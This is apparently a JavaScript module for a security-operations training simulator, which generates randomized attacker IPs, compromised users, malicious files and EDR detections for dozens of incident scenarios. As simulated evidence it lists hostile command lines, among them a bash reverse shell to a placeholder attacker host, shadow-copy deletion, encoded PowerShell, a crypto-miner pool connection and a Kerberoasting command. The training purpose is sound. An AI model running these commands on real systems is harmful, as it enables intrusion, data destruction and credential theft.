// ─── Run Seed: Single source of truth for randomized SOC simulation runs ─────
// Every evidence source (SIEM logs, alerts, EDR, endpoints) and every challenge
// answer derives from this seed, so remediation always matches the visible evidence.

import { ENDPOINTS } from "./socData";
import { getDynamicProfile } from "./dynamicRegistry";

// ─── IOC Pools ────────────────────────────────────────────────────────────────

const ATTACKER_IP_POOL = [
  "45.95.147.23", "91.92.247.18", "185.220.101.47", "91.108.4.22",
  "185.176.27.101", "5.188.206.14", "185.42.116.10", "194.165.22.10",
  "91.213.85.10", "5.188.10.220", "94.102.49.190", "185.234.219.5",
  "91.108.56.180", "212.58.244.18", "185.62.190.100", "193.27.228.140",
];

const USER_POOL = [
  { sam: "jsmith", upn: "jsmith@company.com", endpoint: "win-ws-01" },
  { sam: "mjohnson", upn: "mjohnson@company.com", endpoint: "win-ws-02" },
  { sam: "helpdesk01", upn: "helpdesk01@company.com", endpoint: "win-ws-01" },
  { sam: "svc-backup", upn: "svc-backup@company.com", endpoint: "win-srv-01" },
  { sam: "appuser", upn: "appuser@company.com", endpoint: "linux-srv-01" },
  { sam: "svc-admin", upn: "svc-admin@company.com", endpoint: "dc-01" },
];

const MALICIOUS_FILE_POOL = [
  "C:\\Windows\\Temp\\svchost32.exe",
  "E:\\setup.exe",
  "C:\\Users\\USER\\AppData\\Roaming\\svchost32.exe",
  "/tmp/.sys_cache",
  "/usr/local/bin/xmrig",
  "C:\\Windows\\Temp\\update.exe",
  "C:\\Users\\USER\\Downloads\\free_tool.exe",
];

const MALICIOUS_PROCESS_POOL = [
  { name: "powershell.exe -enc SQBFAFgA...", file: null, mitre: "T1059.001" },
  { name: "svchost32.exe -s", file: "C:\\Windows\\Temp\\svchost32.exe", mitre: "T1036" },
  { name: "xmrig --donate-level 1", file: "/usr/local/bin/xmrig", mitre: "T1496" },
  { name: "AnyDesk.exe", file: "C:\\Program Files\\AnyDesk\\AnyDesk.exe", mitre: "T1219" },
  { name: "cmd.exe /c vssadmin delete shadows /all /quiet", file: null, mitre: "T1490" },
  { name: "wmic.exe /node process call create cmd.exe", file: null, mitre: "T1047" },
  { name: "WINWORD.EXE /macro", file: null, mitre: "T1204" },
  { name: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", file: null, mitre: "T1059.004" },
];

const PERSISTENCE_POOL = [
  "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svcupdate",
  "C:\\Windows\\Temp\\svchost32.exe scheduled task",
  "C:\\Users\\Public\\updater.bat in StartUp folder",
  "systemd service 'update-checker' (auto-start)",
  "HKCU\\Run\\WinUpdate (svchost32.exe auto-start)",
  "WMI ActiveScriptEventConsumer (encoded PS payload)",
];

// ─── Scenario Profiles ─────────────────────────────────────────────────────────
// Defines which IOC types each scenario uses and the default values in existing
// templates (for substitution). The seed generator randomizes from pools.

const PROFILES = {
  brute_force_vpn: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "45.95.147.23", compromisedUser: "mjohnson" },
    patientZero: "vpn-gw",
  },
  phishing_compromise: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "91.108.4.22", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  ransomware_outbreak: {
    iocs: ["attackerIP", "compromisedUser", "maliciousFile", "maliciousProcess", "persistence"],
    defaults: { attackerIP: "185.220.101.47", compromisedUser: "jsmith", maliciousFile: "C:\\Windows\\Temp\\svchost32.exe" },
    patientZero: "win-ws-01",
  },
  ransomware_note_found: {
    iocs: ["attackerIP", "compromisedUser", "maliciousFile", "persistence"],
    defaults: { attackerIP: "185.220.101.47", compromisedUser: "jsmith", maliciousFile: "C:\\Windows\\Temp\\svchost32.exe" },
    patientZero: "win-ws-01",
  },
  lateral_movement: {
    iocs: ["attackerIP", "compromisedUser", "maliciousProcess"],
    defaults: { attackerIP: "5.188.206.14", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  data_exfiltration: {
    iocs: ["compromisedUser"],
    defaults: { compromisedUser: "appuser" },
    patientZero: "linux-srv-01",
  },
  insider_threat: {
    iocs: ["compromisedUser"],
    defaults: { compromisedUser: "mjohnson" },
    patientZero: "win-ws-02",
  },
  web_compromise: {
    iocs: ["attackerIP", "maliciousProcess"],
    defaults: { attackerIP: "91.92.247.18" },
    patientZero: "linux-web-01",
  },
  suspicious_login: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "212.58.244.18", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  malware_usb: {
    iocs: ["compromisedUser", "maliciousFile", "maliciousProcess"],
    defaults: { compromisedUser: "jsmith", maliciousFile: "E:\\setup.exe" },
    patientZero: "win-ws-01",
  },
  spam_campaign: {
    iocs: ["compromisedUser", "maliciousProcess"],
    defaults: { compromisedUser: "mjohnson" },
    patientZero: "win-ws-02",
  },
  password_spray: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "91.108.56.180", compromisedUser: "helpdesk01" },
    patientZero: "dc-01",
  },
  port_scan: {
    iocs: ["attackerIP"],
    defaults: { attackerIP: "185.234.219.5" },
    patientZero: "fw-01",
  },
  rogue_wifi: {
    iocs: [],
    defaults: {},
    patientZero: "win-ws-01",
  },
  account_lockout: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "91.92.0.50", compromisedUser: "svc_helpdesk" },
    patientZero: "dc-01",
  },
  malicious_macro: {
    iocs: ["compromisedUser", "maliciousProcess", "persistence"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  dlp_alert: {
    iocs: ["compromisedUser"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  av_detection: {
    iocs: ["compromisedUser", "maliciousFile", "maliciousProcess", "persistence"],
    defaults: { compromisedUser: "jsmith", maliciousFile: "C:\\Users\\jsmith\\Downloads\\free_tool.exe" },
    patientZero: "win-ws-01",
  },
  web_phishing_report: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "91.92.247.18", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  unusual_process: {
    iocs: ["compromisedUser", "maliciousFile", "maliciousProcess", "persistence"],
    defaults: { compromisedUser: "jsmith", maliciousFile: "C:\\Users\\jsmith\\AppData\\Roaming\\svchost32.exe" },
    patientZero: "win-ws-01",
  },
  dns_anomaly: {
    iocs: ["compromisedUser", "maliciousProcess"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  privileged_misuse: {
    iocs: ["compromisedUser"],
    defaults: { compromisedUser: "svc-backup" },
    patientZero: "win-srv-01",
  },
  rdp_external: {
    iocs: ["attackerIP", "compromisedUser", "maliciousProcess"],
    defaults: { attackerIP: "91.92.247.11", compromisedUser: "Administrator" },
    patientZero: "win-srv-01",
  },
  crypto_miner: {
    iocs: ["maliciousProcess", "maliciousFile", "persistence"],
    defaults: { maliciousFile: "/usr/local/bin/xmrig" },
    patientZero: "linux-srv-01",
  },
  fake_helpdesk: {
    iocs: ["compromisedUser", "maliciousProcess"],
    defaults: { compromisedUser: "mjohnson" },
    patientZero: "win-ws-02",
  },
  data_on_pastebin: {
    iocs: ["compromisedUser"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  shadow_it: {
    iocs: ["compromisedUser"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  cloud_compromise: {
    iocs: ["attackerIP"],
    defaults: { attackerIP: "185.176.27.101" },
    patientZero: "linux-srv-01",
  },
  supply_chain_attack: {
    iocs: ["attackerIP", "maliciousProcess", "maliciousFile"],
    defaults: { attackerIP: "94.102.49.190" },
    patientZero: "win-ws-01",
  },
  zero_day_exploit: {
    iocs: ["attackerIP", "maliciousFile", "maliciousProcess"],
    defaults: { attackerIP: "185.176.27.200", maliciousFile: "/tmp/.sys_cache" },
    patientZero: "linux-web-01",
  },
  active_directory_attack: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "185.62.190.100", compromisedUser: "svc-admin" },
    patientZero: "dc-01",
  },
  ot_ics_intrusion: {
    iocs: ["attackerIP"],
    defaults: { attackerIP: "91.92.0.100" },
    patientZero: "win-ws-01",
  },
  multi_stage_apt: {
    iocs: ["attackerIP", "compromisedUser", "maliciousProcess"],
    defaults: { attackerIP: "185.220.101.200", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  container_escape: {
    iocs: ["maliciousProcess"],
    defaults: {},
    patientZero: "linux-srv-01",
  },
  business_email_compromise: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "185.176.27.50", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  ransomware_double_extortion: {
    iocs: ["attackerIP", "compromisedUser", "maliciousFile"],
    defaults: { attackerIP: "185.220.101.99", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  credential_stuffing: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "185.234.219.5", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  man_in_the_middle: {
    iocs: ["attackerIP"],
    defaults: { attackerIP: "10.0.1.50" },
    patientZero: "win-ws-01",
  },
  fileless_malware: {
    iocs: ["compromisedUser", "maliciousProcess", "persistence"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  kerberoasting: {
    iocs: ["attackerIP", "compromisedUser", "maliciousProcess"],
    defaults: { attackerIP: "91.108.56.50", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  siem_evasion: {
    iocs: ["compromisedUser", "maliciousProcess"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  wiper_malware: {
    iocs: ["compromisedUser", "maliciousProcess"],
    defaults: { compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
  oauth_token_theft: {
    iocs: ["attackerIP", "compromisedUser"],
    defaults: { attackerIP: "185.62.190.100", compromisedUser: "jsmith" },
    patientZero: "win-ws-01",
  },
};

// ─── Randomization Helpers ────────────────────────────────────────────────────

function pick(pool) {
  return pool[Math.floor(Math.random() * pool.length)];
}

function pickN(pool, n) {
  const shuffled = [...pool].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, n);
}

function randRange(min, max) {
  return Math.round((min + Math.random() * (max - min)) * 10) / 10;
}

// ─── Seed Generation ────────────────────────────────────────────────────────────

export function generateRunSeed(scenarioId) {
  const dynProfile = getDynamicProfile(scenarioId);
  const profile = dynProfile
    ? { iocs: dynProfile.iocs || [], defaults: {}, patientZero: dynProfile.patientZero || "win-ws-01" }
    : (PROFILES[scenarioId] || { iocs: [], defaults: {}, patientZero: "win-ws-01" });
  const iocTypes = new Set(profile.iocs);
  const seed = {
    scenarioId,
    runId: `run-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    substitutions: {},
  };

  // Attacker IP
  if (iocTypes.has("attackerIP")) {
    seed.attackerIP = pick(ATTACKER_IP_POOL);
    if (profile.defaults.attackerIP) {
      seed.substitutions[profile.defaults.attackerIP] = seed.attackerIP;
    }
  }

  // Compromised user
  if (iocTypes.has("compromisedUser")) {
    const defaultUser = profile.defaults.compromisedUser;
    // For special users like "Administrator", "svc_helpdesk", keep them (they're role-specific)
    const isSpecialUser = ["Administrator", "svc_helpdesk", "svc-backup", "svc-admin"].includes(defaultUser);
    if (isSpecialUser) {
      seed.compromisedUser = { sam: defaultUser, upn: defaultUser.includes("@") ? defaultUser : `${defaultUser}@company.com` };
    } else {
      const picked = pick(USER_POOL);
      seed.compromisedUser = { sam: picked.sam, upn: picked.upn };
      if (defaultUser) {
        seed.substitutions[defaultUser] = seed.compromisedUser.sam;
      }
    }
  }

  // Patient-zero endpoint (randomize if profile allows)
  const patientZeroPool = ENDPOINTS.filter(ep =>
    !["fw-01", "vpn-gw"].includes(ep.id) || profile.patientZero === ep.id
  );
  seed.patientZero = profile.patientZero && Math.random() > 0.5
    ? profile.patientZero
    : pick(patientZeroPool).id;

  // Malicious file
  if (iocTypes.has("maliciousFile")) {
    const defaultFile = profile.defaults.maliciousFile;
    seed.maliciousFile = pick(MALICIOUS_FILE_POOL);
    if (defaultFile) {
      seed.substitutions[defaultFile] = seed.maliciousFile;
    }
  }

  // Malicious processes (1-3 from pool, always include scenario-relevant ones)
  if (iocTypes.has("maliciousProcess")) {
    const count = 1 + Math.floor(Math.random() * 2); // 1-2 processes
    seed.maliciousProcesses = pickN(MALICIOUS_PROCESS_POOL, count).map(p => ({
      ...p,
      name: p.name.replace("ATTACKER", seed.attackerIP || "185.220.101.47").replace("USER", seed.compromisedUser?.sam || "jsmith"),
      file: p.file ? p.file.replace("USER", seed.compromisedUser?.sam || "jsmith") : null,
    }));
  }

  // Persistence artifacts (1-3 from pool)
  if (iocTypes.has("persistence")) {
    seed.persistenceArtifacts = pickN(PERSISTENCE_POOL, 2 + Math.floor(Math.random() * 2));
  }

  // Threat parameters (randomized within scenario-appropriate ranges)
  seed.threat = {
    initial: Math.round(randRange(22, 38)),
    rate: randRange(3.5, 7),
    containment: Math.round(randRange(10, 18)),
  };

  // Escalation branch (randomized)
  seed.escalationBranch = Math.floor(Math.random() * 3);

  return seed;
}

// ─── IOC Substitution ──────────────────────────────────────────────────────────

export function applySubstitutions(text, substitutions) {
  if (!text || typeof text !== "string") return text;
  let result = text;
  for (const [from, to] of Object.entries(substitutions)) {
    // Use split+join for reliable global replacement
    result = result.split(from).join(String(to));
  }
  return result;
}

export function substituteObject(obj, substitutions) {
  if (!obj || typeof obj !== "object") return obj;
  const result = { ...obj };
  for (const key of Object.keys(result)) {
    if (typeof result[key] === "string") {
      result[key] = applySubstitutions(result[key], substitutions);
    }
  }
  return result;
}

// ─── Scenario-Specific EDR Generation ───────────────────────────────────────────

export function generateEDRFromSeed(scenarioId, seed) {
  const detections = [];
  const now = Date.now();
  const patientZeroEp = ENDPOINTS.find(ep => ep.id === seed.patientZero) || ENDPOINTS[0];

  // Generate EDR detections from seed's malicious processes
  if (seed.maliciousProcesses) {
    seed.maliciousProcesses.forEach((proc, i) => {
      detections.push({
        id: `edr-${i}`,
        endpoint: patientZeroEp.name,
        process: proc.name.split(" ")[0],
        pid: 1000 + Math.floor(Math.random() * 9000),
        parent: ["explorer.exe", "cmd.exe", "winword.exe", "powershell.exe"][i % 4],
        cmdline: proc.name,
        severity: proc.mitre === "T1490" ? "critical" : "high",
        mitre: proc.mitre,
        time: new Date(now - (30 - i * 5) * 60000).toISOString(),
      });
    });
  }

  // Add scenario-specific EDR detections
  const scenarioEDR = SCENARIO_EDR[scenarioId];
  if (scenarioEDR) {
    scenarioEDR.forEach((d, i) => {
      const ep = ENDPOINTS.find(e => e.id === (d.endpointId || seed.patientZero)) || patientZeroEp;
      detections.push({
        id: `edr-s-${i}`,
        endpoint: ep.name,
        process: d.process,
        pid: 2000 + i * 137,
        parent: d.parent || "services.exe",
        cmdline: applySubstitutions(d.cmdline, seed.substitutions),
        severity: d.severity,
        mitre: d.mitre,
        time: new Date(now - d.minsAgo * 60000).toISOString(),
      });
    });
  }

  // If no detections at all, add a generic one from the seed
  if (detections.length === 0) {
    detections.push({
      id: "edr-0",
      endpoint: patientZeroEp.name,
      process: "powershell.exe",
      pid: 4892,
      parent: "cmd.exe",
      cmdline: applySubstitutions("powershell.exe -enc SQBFAFgA...", seed.substitutions),
      severity: "high",
      mitre: "T1059.001",
      time: new Date(now - 38 * 60000).toISOString(),
    });
  }

  return detections;
}

// Scenario-specific EDR templates (supplement seed-generated detections)
const SCENARIO_EDR = {
  ransomware_outbreak: [
    { process: "vssadmin.exe", cmdline: "vssadmin.exe delete shadows /all /quiet", parent: "cmd.exe", severity: "critical", mitre: "T1490", minsAgo: 28, endpointId: "win-srv-01" },
    { process: "wmic.exe", cmdline: "wmic.exe /node:10.0.1.11 process call create cmd.exe /c whoami", parent: "powershell.exe", severity: "high", mitre: "T1047", minsAgo: 15, endpointId: "win-ws-01" },
  ],
  lateral_movement: [
    { process: "lsass.exe", cmdline: "lsass.exe (memory read by procdump.exe)", parent: "wininit.exe", severity: "critical", mitre: "T1003.001", minsAgo: 55, endpointId: "dc-01" },
  ],
  web_compromise: [
    { process: "bash", cmdline: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", parent: "apache2", severity: "critical", mitre: "T1059.004", minsAgo: 60, endpointId: "linux-web-01" },
  ],
  crypto_miner: [
    { process: "xmrig", cmdline: "xmrig --donate-level 1 -o pool.minexmr.com:443", parent: "systemd", severity: "high", mitre: "T1496", minsAgo: 80, endpointId: "linux-srv-01" },
  ],
  malicious_macro: [
    { process: "powershell.exe", cmdline: "powershell.exe -w hidden -enc SQBFAFgA...", parent: "WINWORD.EXE", severity: "critical", mitre: "T1059.001", minsAgo: 23, endpointId: "win-ws-01" },
  ],
  fileless_malware: [
    { process: "svchost.exe", cmdline: "svchost.exe (process hollowing — injected payload)", parent: "services.exe", severity: "critical", mitre: "T1055", minsAgo: 80, endpointId: "win-ws-01" },
  ],
  kerberoasting: [
    { process: "Rubeus.exe", cmdline: "Rubeus.exe kerberoast /outfile:hashes.txt", parent: "cmd.exe", severity: "critical", mitre: "T1558.003", minsAgo: 30, endpointId: "win-ws-01" },
  ],
};